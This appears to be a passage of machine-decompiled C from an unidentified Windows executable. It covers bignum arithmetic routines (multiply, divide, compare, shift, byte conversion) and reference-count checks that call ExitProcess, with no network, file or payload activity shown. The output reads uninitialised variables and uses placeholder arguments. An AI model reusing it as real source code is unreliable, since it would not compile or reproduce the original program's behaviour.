        *(int16_t *)(v7 + 6) = v8;
        v5 = (int32_t *)(v7 + 8);
        v4 = v8;
        v6 = (int32_t *)v7;
        result = v7;
    } else {
        int32_t * v9 = (int32_t *)v3;
        int32_t * v10 = (int32_t *)(v1 + 60); // 0x4073ff
        *v10 = *v10 - 1;
        *v2 = *v9;
        int32_t * v11 = (int32_t *)(v3 + 8);
        if (*v11 != 0) {
            // 0x40740b
            ExitProcess(0);
            // UNREACHABLE
        }
        // 0x407413
        function_407458();
        v5 = v11;
        v4 = v1;
        v6 = v9;
        result = v3;
    }
    // 0x407441
    *v6 = 0;
    *(int16_t *)(result + 4) = v4;
    *v5 = 1;
    int32_t * v12 = (int32_t *)(v1 + 56); // 0x407451
    *v12 = *v12 + 1;
    return result;
}

// Address range: 0x407458 - 0x4074b0
int32_t function_407458(void) {
    // 0x407458
    int32_t v1; // 0x407458
    int32_t v2 = v1;
    int16_t * v3 = (int16_t *)(v1 + 6); // 0x40745e
    int32_t v4 = (int32_t)*v3; // 0x40745e
    int32_t v5 = v4; // 0x407464
    if (v2 > v4) {
        int32_t v6 = 2 * v4; // 0x407466
        int32_t v7 = v6 - v2; // 0x40746a
        int32_t v8 = v7 < 0 == ((v7 ^ v6) & (v6 ^ v2)) < 0 == (v7 != 0) ? v6 : v2; // 0x40746c
        *v3 = (int16_t)v8;
        int32_t * v9 = (int32_t *)(v1 + 12); // 0x40747b
        v5 = function_401050(*v9, 0x10000 * v8 >> 14);
        *v9 = v5;
    }
    int16_t * v10 = (int16_t *)(v1 + 4); // 0x407488
    int32_t v11 = (int32_t)*v10; // 0x407488
    int32_t result = v5; // 0x40748e
    if (v2 > v11) {
        int32_t v12 = *(int32_t *)(v1 + 12); // 0x407498
        result = function_401293((int32_t *)(v12 + 4 * v11), 0, 4 * (v2 - v11));
    }
    // 0x4074a9
    *v10 = (int16_t)v2;
    return result;
}

// Address range: 0x4074b0 - 0x4074fc
int32_t function_4074b0(void) {
    // 0x4074b0
    int32_t v1; // 0x4074b0
    uint16_t v2 = *(int16_t *)(v1 + 4); // 0x4074b0
    uint16_t v3 = *(int16_t *)(v1 + 4); // 0x4074b5
    if (v3 > v2) {
        // 0x4074f8
        return 1;
    }
    // 0x4074c3
    if (v3 < v2) {
        // 0x4074f8
        return -1;
    }
    int32_t v4 = *(int32_t *)(v1 + 12); // 0x4074ca
    int32_t v5 = (int32_t)v3 - 1; // 0x4074d6
    int32_t v6 = v5; // 0x4074d9
    int32_t v7 = v4 + 4 * v5; // 0x4074d9
    uint32_t v8 = *(int32_t *)(*(int32_t *)(v1 + 12) - v4 + v7); // 0x4074dc
    uint32_t v9 = *(int32_t *)v7; // 0x4074df
    int32_t result = 1; // 0x4074e1
    while (v9 <= v8) {
        // 0x4074e3
        result = -1;
        if (v9 < v8) {
            // break -> 0x4074f8
            break;
        }
        // 0x4074e5
        v6--;
        v7 -= 4;
        result = 0;
        if (v6 < 0) {
            // break -> 0x4074f8
            break;
        }
        v8 = *(int32_t *)(*(int32_t *)(v1 + 12) - v4 + v7);
        v9 = *(int32_t *)v7;
        result = 1;
    }
    // 0x4074f8
    return result;
}

// Address range: 0x4074fc - 0x407512
int32_t function_4074fc(int32_t a1) {
    // 0x4074fc
    return function_407512(a1, 0, 0);
}

// Address range: 0x407512 - 0x407607
int32_t function_407512(int32_t a1, int32_t a2, int32_t a3) {
    // 0x407512
    int32_t v1; // 0x407512
    int32_t v2 = (int32_t)*(int16_t *)(v1 + 4); // 0x407525
    uint32_t v3 = (int32_t)*(int16_t *)(a1 + 4); // 0x40752c
    int32_t v4 = *(int32_t *)(function_4073ef() + 12); // 0x407557
    function_401293((int32_t *)v4, 0, 4 * (v3 + v2));
    int32_t v5 = 0; // 0x407570
    int32_t v6 = a3 - 1;
    int32_t v7 = v2 > a3 == a3 != 0 == a3 > 0 ? v6 : 0;
    int32_t * v8 = (int32_t *)(4 * v5 + *(int32_t *)(a1 + 12));
    int32_t v9 = 4 * v7 + *(int32_t *)(v1 + 12); // 0x407597
    int32_t v10 = v7; // 0x407597
    int32_t v11 = v2 > a3 == a3 != 0 == a3 > 0 ? a3 - 1 : v5;
    int32_t v12 = 0;
    int32_t v13 = v11; // 0x40759e
    int32_t v14 = v12; // 0x40759e
    uint64_t v15; // 0x4075aa
    uint32_t v16; // 0x4075aa
    int32_t * v17; // 0x4075ad
    uint32_t v18; // 0x4075ad
    uint32_t v19; // 0x4075b3
    int32_t v20; // 0x4075bc
    int32_t v21; // 0x4075c5
    while (a2 == 0 || v11 < a2) {
        // 0x4075a5
        v15 = (int64_t)*v8 * (int64_t)*(int32_t *)v9;
        v16 = (int32_t)v15;
        v17 = (int32_t *)(4 * v11 + v4);
        v18 = *v17 + v16;
        v19 = v18 + v12;
        *v17 = v19;
        v20 = (int32_t)(v18 < v16) + (int32_t)(v15 / 0x100000000) + (int32_t)(v19 < v18);
        v21 = v11 + 1;
        v10++;
        v9 += 4;
        v13 = v21;
        v14 = v20;
        if (v10 >= v2) {
            // break -> 0x4075cf
            break;
        }
        v11 = v21;
        v12 = v20;
        v13 = v11;
        v14 = v12;
    }
    // 0x4075cf
    v5++;
    *(int32_t *)(4 * v13 + v4) = v14;
    while (v5 < v3) {
        int32_t v22 = v6;
        v6 = v22 - 1;
        v7 = v2 > a3 == a3 != 0 == v22 > 0 ? v6 : 0;
        v8 = (int32_t *)(4 * v5 + *(int32_t *)(a1 + 12));
        v9 = 4 * v7 + *(int32_t *)(v1 + 12);
        v10 = v7;
        v11 = v2 > a3 == a3 != 0 == v22 > 0 ? a3 - 1 : v5;
        v12 = 0;
        v13 = v11;
        v14 = v12;
        while (a2 == 0 || v11 < a2) {
            // 0x4075a5
            v15 = (int64_t)*v8 * (int64_t)*(int32_t *)v9;
            v16 = (int32_t)v15;
            v17 = (int32_t *)(4 * v11 + v4);
            v18 = *v17 + v16;
            v19 = v18 + v12;
            *v17 = v19;
            v20 = (int32_t)(v18 < v16) + (int32_t)(v15 / 0x100000000) + (int32_t)(v19 < v18);
            v21 = v11 + 1;
            v10++;
            v9 += 4;
            v13 = v21;
            v14 = v20;
            if (v10 >= v2) {
                // break -> 0x4075cf
                break;
            }
            v11 = v21;
            v12 = v20;
            v13 = v11;
            v14 = v12;
        }
        // 0x4075cf
        v5++;
        *(int32_t *)(4 * v13 + v4) = v14;
    }
    // 0x4075e4
    function_407d69();
    function_407d69();
    return function_40735b();
}

// Address range: 0x407607 - 0x407641
int32_t function_407607(void) {
    // 0x407607
    function_407d95();
    function_407d69();
    function_407d95();
    function_407d69();
    function_407d95();
    return function_407d69();
}

// Address range: 0x407641 - 0x4076c6
int32_t function_407641(void) {
    // 0x407641
    int32_t v1; // 0x407641
    int32_t v2 = *(int32_t *)(v1 + 12); // 0x407654
    int32_t v3 = *(int32_t *)(v2 - 4 + 4 * (int32_t)*(int16_t *)(v1 + 4)); // 0x407657
    int32_t v4 = function_401140(0, 1, v3 + 1, 0); // 0x407661
    function_407dae();
    *(int32_t *)(v1 + 36) = function_407ba2(v4);
    function_407dae();
    function_407d2d();
    function_4077b4();
    int32_t v5 = function_4078a0((int32_t)&g322, (int32_t)&g322); // 0x4076b0
    *(int32_t *)(v1 + 24) = v5;
    return function_407dae();
}

// Address range: 0x4076c6 - 0x407738
int32_t function_4076c6(int32_t a1) {
    // 0x4076c6
    function_401293((int32_t *)a1, 0, 128);
    int32_t v1; // 0x4076c6
    int16_t * v2 = (int16_t *)(v1 + 4); // 0x4076e6
    if (*v2 < 1) {
      lab_0x407729:
        // 0x407729
        return function_407d69();
    }
    int32_t v3 = *(int32_t *)(v1 + 12); // 0x4076f3
    int32_t v4 = 0; // 0x4076f3
    int32_t v5 = 0; // 0x4076f6
    uint32_t v6 = 0;
    int32_t v7 = *(int32_t *)v3; // 0x407702
    *(char *)(v5 + a1) = (char)((v7 & 255 << v6) >> v6);
    int32_t v8 = v5 + 1; // 0x407709
    if (v8 > 128) {
        return function_407d69();
    }
    int32_t v9 = v6 + 8; // 0x407715
    v5 = v8;
    while (v9 < 32) {
        // 0x4076f8
        v6 = v9;
        v7 = *(int32_t *)v3;
        *(char *)(v5 + a1) = (char)((v7 & 255 << v6) >> v6);
        v8 = v5 + 1;
        if (v8 > 128) {
            return function_407d69();
        }
        // 0x407715
        v9 = v6 + 8;
        v5 = v8;
    }
    // 0x40771d
    v4++;
    v3 += 4;
    while (v4 < (int32_t)*v2) {
        // 0x4076f6
        v6 = 0;
        v7 = *(int32_t *)v3;
        *(char *)(v8 + a1) = (char)((v7 & 255 << v6) >> v6);
        v8++;
        if (v8 > 128) {
            return function_407d69();
        }
        // 0x407715
        v9 = v6 + 8;
        v5 = v8;
        while (v9 < 32) {
            // 0x4076f8
            v6 = v9;
            v7 = *(int32_t *)v3;
            *(char *)(v5 + a1) = (char)((v7 & 255 << v6) >> v6);
            v8 = v5 + 1;
            if (v8 > 128) {
                return function_407d69();
            }
            // 0x407715
            v9 = v6 + 8;
            v5 = v8;
        }
        // 0x40771d
        v4++;
        v3 += 4;
    }
    // 0x407729
    return function_407d69();
}

// Address range: 0x407738 - 0x4077b4
int32_t function_407738(int32_t a1) {
    int32_t v1 = function_4073ef(); // 0x407751
    int32_t * v2 = (int32_t *)(v1 + 12); // 0x407766
    function_401293((int32_t *)*v2, 0, 4 * (int32_t)*(int16_t *)(v1 + 4));
    int32_t v3 = a1 - 1; // 0x4077a2
    int32_t v4 = v3; // 0x4077a5
    if (v3 < 0) {
        // 0x4077a7
        return function_40735b();
    }
    int32_t v5 = 0; // 0x4077a5
    int32_t v6 = 0;
    int32_t * v7 = (int32_t *)(*v2 + 4 * v5); // 0x407787
    int32_t v8; // 0x407738
    *v7 = ((int32_t)*(char *)(v4 + v8) << (8 * v6 & 24)) + *v7;
    int32_t v9 = v6 != 3 ? v6 + 1 : 0; // 0x40779d
    v4--;
    v5 += (int32_t)(v6 == 3);
    while (v4 >= 0) {
        // 0x407773
        v6 = v9;
        v7 = (int32_t *)(*v2 + 4 * v5);
        *v7 = ((int32_t)*(char *)(v4 + v8) << (8 * v6 & 24)) + *v7;
        v9 = v6 != 3 ? v6 + 1 : 0;
        v4--;
        v5 += (int32_t)(v6 == 3);
    }
    // 0x4077a7
    return function_40735b();
}

// Address range: 0x4077b4 - 0x407804
int32_t function_4077b4(void) {
    // 0x4077b4
    int32_t result; // 0x4077b4
    if (result < 1) {
        // 0x4077fe
        return result;
    }
    int32_t v1 = (int32_t)*(int16_t *)(result + 4) - 1; // 0x4077bf
    function_407458();
    int32_t * v2 = (int32_t *)(result + 12); // 0x4077ce
    int32_t v3 = *v2; // 0x4077ce
    int32_t v4 = v3 + 4 * v1; // 0x4077d7
    int32_t v5 = v3 + 4 * (v1 + result); // 0x4077d7
    int32_t v6 = v1; // 0x4077d7
    *(int32_t *)v5 = *(int32_t *)v4;
    v4 -= 4;
    v5 -= 4;
    while (v6 != 0) {
        // 0x4077da
        v6--;
        *(int32_t *)v5 = *(int32_t *)v4;
        v4 -= 4;
        v5 -= 4;
    }
    // 0x4077eb
    function_401293((int32_t *)*v2, 0, 4 * result);
    // 0x4077fe
    return result;
}

// Address range: 0x407804 - 0x40783e
int32_t function_407804(void) {
    // 0x407804
    int32_t result; // 0x407804
    int32_t v1 = *(int32_t *)(result + 12); // 0x407806
    int16_t * v2 = (int16_t *)(result + 4); // 0x40780c
    int32_t v3 = (int32_t)*v2 - result; // 0x407810
    if (v3 >= 0 != v3 != 0) {
        // 0x407819
        *(int32_t *)v1 = 0;
        // 0x407838
        *v2 = 1;
        return result;
    }
    int32_t v4 = v1 + 4 * result; // 0x407804
    int32_t v5 = v1; // 0x407804
    int32_t v6 = v3; // 0x407827
    v6--;
    *(int32_t *)v5 = *(int32_t *)v4;
    v4 += 4;
    v5 += 4;
    while (v6 >= 0 == (v6 != 0)) {
        // 0x407825
        v6--;
        *(int32_t *)v5 = *(int32_t *)v4;
        v4 += 4;
        v5 += 4;
    }
    // 0x407838
    *v2 = *v2 - (int16_t)result;
    return result;
}

// Address range: 0x40783e - 0x4078a0
int32_t function_40783e(int32_t a1) {
    // 0x40783e
    int128_t v1; // 0x40783e
    int128_t v2 = v1;
    int64_t v3; // 0x40783e
    __asm_movlpd(v3, __asm_xorps(v2, v2));
    int32_t v4 = v3; // 0x407859
    int32_t v5; // bp-40, 0x40783e
    int32_t v6 = &v5; // 0x407859
    int32_t v7; // 0x40783e
    for (int32_t i = (int32_t)*(int16_t *)(v7 + 4) - 1; i >= 0; i--) {
        // 0x40785c
        *(int32_t *)(v6 - 4) = 0;
        *(int32_t *)(v6 - 8) = a1;
        int32_t * v8 = (int32_t *)(*(int32_t *)(v7 + 12) + 4 * i); // 0x407866
        int32_t v9 = *v8; // 0x407866
        *(int32_t *)(v6 - 12) = v4;
        *(int32_t *)(v6 - 16) = v9;
        int32_t v10 = function_401140(v4, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322); // 0x407871
        *(int32_t *)(v6 - 20) = 0;
        *(int32_t *)(v6 - 24) = a1;
        *v8 = v10;
        *(int32_t *)(v6 - 28) = v4;
        v6 -= 32;
        *(int32_t *)v6 = v9;
        v4 = function_4011b0((int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
    }
    // 0x407894
    return function_40735b();
}

// Address range: 0x4078a0 - 0x407ba2
int32_t function_4078a0(int32_t a1, int32_t a2) {
    // 0x4078a0
    int32_t v1; // 0x4078a0
    int16_t v2 = *(int16_t *)(v1 + 4); // 0x4078be
    unsigned char v3 = *(char *)(v1 + 64); // 0x4078cb
    int32_t result; // 0x4078a0
    if (a2 != 0) {
        // 0x4078d6
        if (function_4074b0() >= 1) {
            // 0x4078e1
            function_407d69();
            // 0x407b9d
            return result;
        }
    }
    int32_t v4 = function_4073ef(); // 0x4078f9
    int32_t v5 = function_4073ef(); // 0x40790c
    int32_t v6 = function_40735b(); // 0x407916
    int32_t v7 = *(int32_t *)(v6 + 12); // 0x407926
    int32_t v8 = *(int32_t *)(v7 - 4 + 4 * (int32_t)*(int16_t *)(v6 + 4)); // 0x407929
    int32_t v9 = 0; // bp-92, 0x407930
    uint32_t v10 = function_401140(0, 1, v8 + 1, 0); // 0x407932
    int16_t * v11 = (int16_t *)(v4 + 4); // 0x40793d
    int32_t * v12 = (int32_t *)(v4 + 12); // 0x407947
    function_401293((int32_t *)*v12, 0, 4 * (int32_t)*v11);
    int32_t v13 = v6; // 0x40795a
    int32_t v14; // 0x4078a0
    if (v10 >= 2) {
        int32_t v15 = function_407ba2(v10); // 0x407961
        if (a2 == 0) {
            // 0x407979
            v13 = function_407ba2(v10);
            v14 = v15;
        } else {
            // 0x40796f
            v13 = *(int32_t *)(v1 + 36 + 4 * (int32_t)v3);
            v14 = v15;
        }
    }
    int16_t * v16 = (int16_t *)(v14 + 4); // 0x407988
    if (v2 == *v16) {
        // 0x407993
        function_407458();
    }
    int32_t v17 = (int32_t)*(int16_t *)(a1 + 4); // 0x4078b4
    int32_t v18 = 4 * v17 + 4; // 0x4079a1
    int32_t * v19 = (int32_t *)(v14 + 12); // 0x4079b2
    int16_t * v20 = (int16_t *)(v13 + 4);
    int32_t * v21 = (int32_t *)(v13 + 12);
    int32_t v22 = 0; // 0x4079a8
    int32_t v23 = v5; // 0x4079a8
    int32_t v24 = &v9; // 0x4079a8
    int32_t * v25; // 0x4078a0
    int32_t * v26; // 0x4078a0
    int32_t * v27; // 0x4078a0
    int32_t * v28; // 0x4078a0
    int32_t * v29; // 0x4078a0
    int32_t * v30; // 0x4078a0
    int32_t v31; // 0x4078a0
    uint32_t v32; // 0x4078a0
    int32_t v33; // 0x4078a0
    int32_t v34; // 0x4078a0
    int32_t v35; // 0x4078a0
    while (true) {
      lab_0x4079ab:;
        int32_t v36 = v24;
        int32_t v37 = v23;
        v32 = v22;
        int32_t * v38 = (int32_t *)(v36 - 4);
        *v38 = v18;
        v35 = v32 + v17;
        int32_t * v39 = (int32_t *)(v36 - 8);
        *v39 = *v19 - 4 + 4 * ((int32_t)*v16 - v35);
        int32_t * v40 = (int32_t *)(v37 + 12); // 0x4079c1
        int32_t * v41 = (int32_t *)(v36 - 12);
        *v41 = *v40;
        function_40126d(&g322, &g322, (int32_t)&g322);
        int32_t v42 = (int32_t)*v20; // 0x4079d6
        int32_t v43 = (int32_t)*(int16_t *)(v37 + 4); // 0x4079d9
        int32_t v44 = *v40; // 0x4079dd
        int32_t v45 = 4 * v43 + v44;
        int32_t v46 = *(int32_t *)(v45 - 4); // 0x4079e9
        int32_t v47 = 4 * v42; // 0x4079f0
        int32_t v48 = *(int32_t *)(v47 - 4 + *v21); // 0x4079f0
        v28 = v41;
        v27 = v39;
        v26 = v38;
        v33 = -1;
        v31 = v36;
        if (v46 != v48) {
            // 0x407a06
            *v38 = 0;
            *v39 = v48;
            int32_t v49 = *(int32_t *)(v45 - 8); // 0x407a0f
            *v41 = v46;
            int32_t v50 = v36 - 16; // 0x407a1f
            *(int32_t *)v50 = v49;
            int32_t v51 = function_401140(v48, v42, v44, v43); // 0x407a20
            int32_t v52 = v51; // 0x407a37
            if (*v20 >= 2) {
                uint32_t v53 = *(int32_t *)(v47 - 8 + *v21); // 0x407a3f
                v52 = v51;
                if (v53 != 0) {
                    uint32_t v54 = v49 - v51 * v48; // 0x407a58
                    uint64_t v55 = (int64_t)v53 * (int64_t)v51; // 0x407a72
                    uint32_t v56 = (int32_t)(v55 / 0x100000000); // 0x407a72
                    v52 = v51;
                    if (v54 <= v56) {
                        uint32_t v57 = *(int32_t *)(v45 - 12); // 0x407a5d
                        v52 = v51 + (int32_t)(v54 < v56 | v57 < (int32_t)v55);
                    }
                }
            }
            int32_t v58 = v52;
            if (v58 == 0) {
                // 0x407b06
                *(int32_t *)(*v12 - 4 + 4 * ((int32_t)*v11 - v32)) = 0;
                v25 = (int32_t *)(v36 - 28);
                v30 = (int32_t *)(v36 - 24);
                v29 = (int32_t *)(v36 - 20);
                v34 = v37;
                v24 = v50;
                goto lab_0x407b1b;
            } else {
                // 0x407a85
                v28 = (int32_t *)(v36 - 28);
                v27 = (int32_t *)(v36 - 24);
                v26 = (int32_t *)(v36 - 20);
                v33 = v58;
                v31 = v50;
                goto lab_0x407a89;
            }
        } else {
            goto lab_0x407a89;
        }
    }
  lab_0x407b57:
    // 0x407b57
    function_407d69();
    function_407d69();
    function_407d69();
    int32_t * v59; // 0x4078a0
    if (a2 == 0) {
        // 0x407b8e
        result = function_40735b();
    } else {
        // 0x407b72
        *v59 = v10;
        function_40735b();
        result = function_40783e((int32_t)&g322);
    }
    // 0x407b9d
    return result;
  lab_0x407a89:;
    int32_t v60 = v31;
    int32_t * v61 = v26;
    int32_t * v62 = v27;
    int32_t * v63 = v28;
    int32_t v64; // bp-60, 0x4078a0
    *v61 = (int32_t)&v64;
    *v62 = v33;
    *v63 = v33;
    function_407dc4();
    *v62 = function_407ba2((int32_t)&g322);
    int32_t v65 = function_407c27((int32_t)&g322, (int32_t)&g322); // 0x407aa7
    function_407458();
    int16_t v66 = *v11; // 0x407abe
    int32_t v67 = *v12; // 0x407ac2
    *(int32_t *)(v67 - 4 + 4 * ((int32_t)v66 - v32)) = v33;
    v25 = v63;
    v30 = v62;
    v29 = v61;
    v34 = v65;
    v24 = v60;
    if (v64 != 0) {
        int32_t * v68 = (int32_t *)(*v12 - 4 + 4 * ((int32_t)*v11 - v32)); // 0x407ae2
        *v68 = *v68 - 1;
        *v61 = function_407dc4();
        int32_t v69 = function_407ca5((int32_t)&g322); // 0x407af3
        int16_t * v70 = (int16_t *)(v69 + 4); // 0x407afc
        *v70 = *v70 - 1;
        *v20 = *v20 - 1;
        v25 = v63;
        v30 = v62;
        v29 = v61;
        v34 = v69;
        v24 = v60;
    }
    goto lab_0x407b1b;
  lab_0x407b1b:
    // 0x407b1b
    v23 = v34;
    v59 = v29;
    *v59 = v18;
    *v30 = *(int32_t *)(v23 + 12);
    *v25 = 4 * ((int32_t)*v16 - v35) - 4 + *v19;
    function_40126d(&g322, &g322, (int32_t)&g322);
    v22 = v32 + 1;
    if (v32 >= (int32_t)v2 - v17) {
        // break -> 0x407b57
        goto lab_0x407b57;
    }
    goto lab_0x4079ab;
}

// Address range: 0x407ba2 - 0x407c27
int32_t function_407ba2(uint32_t a1) {
    // 0x407ba2
    int32_t v1; // 0x407ba2
    uint32_t v2 = (int32_t)*(int16_t *)(v1 + 4); // 0x407bb9
    int32_t v3 = *(int32_t *)(function_4073ef() + 12); // 0x407bcf
    function_401293((int32_t *)v3, 0, 4 * v2 + 4);
    int32_t v4 = 0; // 0x407bed
    int32_t v5 = v3; // 0x407bed
    for (int32_t i = 0; i < v2; i++) {
        uint32_t v6 = *(int32_t *)(4 * i + *(int32_t *)(v1 + 12)); // 0x407bf6
        uint64_t v7 = (int64_t)v6 * (int64_t)a1; // 0x407bf6
        uint32_t v8 = (int32_t)v7; // 0x407bf6
        uint32_t v9 = v4 + v8; // 0x407bf9
        int32_t * v10 = (int32_t *)v5; // 0x407bfe
        uint32_t v11 = *v10; // 0x407bfe
        uint32_t v12 = v9 + v11; // 0x407bfe
        *v10 = v12;
        v5 += 4;
        v4 = (int32_t)(v9 < v8) + (int32_t)(v7 / 0x100000000) + (int32_t)(v12 < v11);
    }
    // 0x407c0d
    *(int32_t *)v5 = v4;
    function_407d69();
    return function_40735b();
}

// Address range: 0x407c27 - 0x407ca5
int32_t function_407c27(int32_t a1, int32_t a2) {
    // 0x407c27
    function_407458();
    int32_t v1; // 0x407c27
    int32_t v2 = *(int32_t *)(v1 + 12); // 0x407c53
    int32_t v3 = (int32_t)*(int16_t *)(v1 + 4); // 0x407c53
    int32_t v4 = 0; // 0x407c53
    int32_t v5 = *(int32_t *)(a1 + 12); // 0x407c53
    int32_t * v6 = (int32_t *)v2; // 0x407c56
    uint32_t v7 = *v6; // 0x407c56
    uint32_t v8 = *(int32_t *)v5; // 0x407c58
    uint32_t v9 = v7 - v8; // 0x407c58
    *v6 = v9 - v4;
    v4 = v7 < v8 | v9 < v4;
    v3--;
    v2 += 4;
    v5 += 4;
    while (v3 != 0) {
        // 0x407c56
        v6 = (int32_t *)v2;
        v7 = *v6;
        v8 = *(int32_t *)v5;
        v9 = v7 - v8;
        *v6 = v9 - v4;
        v4 = v7 < v8 | v9 < v4;
        v3--;
        v2 += 4;
        v5 += 4;
    }
    if (a2 != 0) {
        // 0x407c86
        *(int32_t *)a2 = v4;
    }
    // 0x407c88
    function_40735b();
    function_407d69();
    return function_40735b();
}

// Address range: 0x407ca5 - 0x407d2d
int32_t function_407ca5(int32_t a1) {
    // 0x407ca5
    int32_t v1; // 0x407ca5
    int16_t v2 = *(int16_t *)(v1 + 4); // 0x407cb3
    int16_t v3 = *(int16_t *)(a1 + 4); // 0x407cc2
    int16_t v4 = v2 - v3; // 0x407cc6
    function_407458();
    function_407458();
    int32_t v5 = *(int32_t *)(a1 + 12); // 0x407cee
    int32_t v6 = *(int32_t *)(v1 + 12); // 0x407cee
    int32_t v7 = v4 == 0 | v4 < 0 != ((v4 ^ v2) & (v3 ^ v2)) < 0 ? v3 : v2; // 0x407cee
    int32_t * v8 = (int32_t *)v6; // 0x407cf6
    uint32_t v9 = *v8;
    uint32_t v10 = v9 + *(int32_t *)v5; // 0x407cf6
    uint32_t v11 = v10; // 0x407cfa
    *v8 = v11;
    v6 += 4;
    int32_t v12 = v10 < v9 | v11 < v10; // 0x407d0c
    v7--;
    v5 += 4;
    while (v7 != 0) {
        // 0x407cf1
        v8 = (int32_t *)v6;
        v9 = *v8;
        v10 = v9 + *(int32_t *)v5;
        v11 = v10 + v12;
        *v8 = v11;
        v6 += 4;
        v12 = v10 < v9 | v11 < v10;
        v7--;
        v5 += 4;
    }
    // 0x407d13
    *(int32_t *)v6 = v12;
    function_407d69();
    return function_40735b();
}

// Address range: 0x407d2d - 0x407d57
int32_t function_407d2d(void) {
    int32_t result = function_4073ef(); // 0x407d35
    int32_t v1; // 0x407d2d
    int16_t v2 = *(int16_t *)(v1 + 4); // 0x407d3a
    int32_t v3 = *(int32_t *)(v1 + 12); // 0x407d44
    int32_t v4 = *(int32_t *)(result + 12); // 0x407d47
    function_40126d((int32_t *)v4, (int32_t *)v3, 4 * (int32_t)v2);
    return result;
}

// Address range: 0x407d57 - 0x407d69
int32_t function_407d57(void) {
    int32_t result = function_4073ef(); // 0x407d5a
    *(int32_t *)*(int32_t *)(result + 12) = 1;
    return result;
}

// Address range: 0x407d69 - 0x407d95
int32_t function_407d69(void) {
    // 0x407d69
    int32_t v1; // 0x407d69
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x407d69
    int32_t v3 = *v2; // 0x407d69
    if (v3 == 0x7fff55aa) {
        // 0x407d94
        return 0x7fff55aa;
    }
    int32_t result = v3 - 1; // 0x407d73
    *v2 = result;
    if (result >= 0 == (result != 0)) {
        // 0x407d94
        return result;
    }
    int32_t result2 = *(int32_t *)(v1 + 4); // 0x407d7b
    *(int32_t *)v1 = result2;
    int32_t * v4 = (int32_t *)(v1 + 60); // 0x407d80
    *v4 = *v4 + 1;
    int32_t * v5 = (int32_t *)(v1 + 56); // 0x407d83
    int32_t v6 = *v5 - 1; // 0x407d83
    *v5 = v6;
    if (v6 >= 0) {
        // 0x407d94
        return result2;
    }
    // 0x407d8c
    ExitProcess(0);
    // UNREACHABLE
}

// Address range: 0x407d95 - 0x407dae
int32_t function_407d95(void) {
    // 0x407d95
    int32_t result; // 0x407d95
    int32_t * v1 = (int32_t *)(result + 8); // 0x407d95
    if (*v1 == 0x7fff55aa) {
        // 0x407da6
        *v1 = 1;
        return result;
    }
    // 0x407d9e
    ExitProcess(0);
    // UNREACHABLE
}

// Address range: 0x407dae - 0x407dc4
int32_t function_407dae(void) {
    // 0x407dae
    int32_t result; // 0x407dae
    int32_t * v1 = (int32_t *)(result + 8); // 0x407dae
    if (*v1 == 1) {
        // 0x407dbc
        *v1 = 0x7fff55aa;
        return result;
    }
    // 0x407db4
    ExitProcess(0);
    // UNREACHABLE
}

// Address range: 0x407dc4 - 0x407dd5
int32_t function_407dc4(void) {
    // 0x407dc4
    int32_t result; // 0x407dc4
    int32_t * v1 = (int32_t *)(result + 8); // 0x407dc4
    int32_t v2 = *v1; // 0x407dc4
    if (v2 != 0x7fff55aa) {
        // 0x407dce
        *v1 = v2 + 1;
    }
    // 0x407dd2
    return result;
}

// Address range: 0x407dd5 - 0x407e03
int32_t function_407dd5(void) {
    // 0x407dd5
    int32_t v1; // 0x407dd5
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x407dd9
    int32_t v3 = *v2; // 0x407dd9
    if (v3 == 0) {
        // 0x407e00
        int32_t result; // 0x407dd5
        return result;
    }
    // 0x407de0
    int32_t v4; // bp-12, 0x407dd5
    int32_t v5 = &v4; // 0x407de0
    *(int32_t *)(v5 - 4) = *(int32_t *)(v3 + 12);
    int32_t v6 = *(int32_t *)v3; // 0x407de4
    function_401014((int32_t)&g322);
    *(int32_t *)(v5 - 8) = v3;
    int32_t result2 = function_401014((int32_t)&g322); // 0x407dec
    while (v6 != 0) {
        int32_t v7 = v6;
        *(int32_t *)(v5 - 4) = *(int32_t *)(v7 + 12);
        v6 = *(int32_t *)v7;
        function_401014((int32_t)&g322);
        *(int32_t *)(v5 - 8) = v7;
        result2 = function_401014((int32_t)&g322);
    }
    int32_t * v8 = (int32_t *)(v1 + 60); // 0x407df9
    *v8 = *v8 & v6;
    *v2 = *v2 & v6;
    // 0x407e00
    return result2;
}

// Address range: 0x407e03 - 0x407e36
int32_t function_407e03(void) {
    // 0x407e03
    function_407d95();
    function_407d69();
    int32_t v1; // 0x407e03
    if (*(int32_t *)(v1 + 56) == 0) {
        // 0x407e26
        function_407dd5();
        return function_401014(v1);
    }
    // 0x407e1e
    ExitProcess(0);
    // UNREACHABLE
}

// Address range: 0x407e36 - 0x407e70
int32_t function_407e36(void) {
    int32_t result = function_40107e(1, 68); // 0x407e3b
    int32_t v1 = function_4073ef(); // 0x407e49
    int32_t * v2 = (int32_t *)(result + 8); // 0x407e4e
    *v2 = v1;
    *(int32_t *)*(int32_t *)(v1 + 12) = 0;
    *(int32_t *)(*(int32_t *)(*v2 + 12) + 4) = 1;
    function_407dae();
    return result;
}

// Address range: 0x407e70 - 0x4080d0
int32_t function_407e70(int32_t * a1, int32_t a2, uint32_t a3, int32_t * a4) {
    // 0x407e70
    int32_t v1; // 0x407e70
    uint32_t v2 = v1;
    int128_t v3; // 0x407e70
    int128_t v4 = v3;
    *a4 = 0;
    unsigned char v5 = *(char *)(v1 + 7); // 0x407e8e
    unsigned char v6 = *(char *)(v1 + 6); // 0x407e97
    unsigned char v7 = *(char *)(v1 + 5); // 0x407ea7
    unsigned char v8 = *(char *)(v1 + 4); // 0x407eb7
    unsigned char v9 = *(char *)(v1 + 3); // 0x407ec7
    unsigned char v10 = *(char *)(v1 + 2); // 0x407ed7
    unsigned char v11 = *(char *)(v1 + 1); // 0x407ee7
    uint32_t v12 = 256 * (256 * (256 * (int32_t)v9 | (int32_t)v10) | (int32_t)v11) | v1 % 256; // 0x407f04
    if ((256 * (256 * (256 * (int32_t)v5 | (int32_t)v6) | (int32_t)v7) || (int32_t)v8) != 0 || v12 > a3) {
        // 0x4080cb
        return 1;
    }
    // 0x407f27
    int64_t v13; // 0x407e70
    __asm_movlpd(v13, __asm_xorps(v4, v4));
    int32_t v14 = function_407e36(); // 0x407f2f
    if (v14 == 0) {
        // 0x4080cb
        return 1;
    }
    int32_t v15 = (int32_t)a1;
    int32_t v16 = function_407738(*(int32_t *)(v15 + 1028)); // 0x407f52
    if (v16 == 0 || function_407738(*(int32_t *)(v15 + 512)) == 0) {
        // 0x4080cb
        return 1;
    }
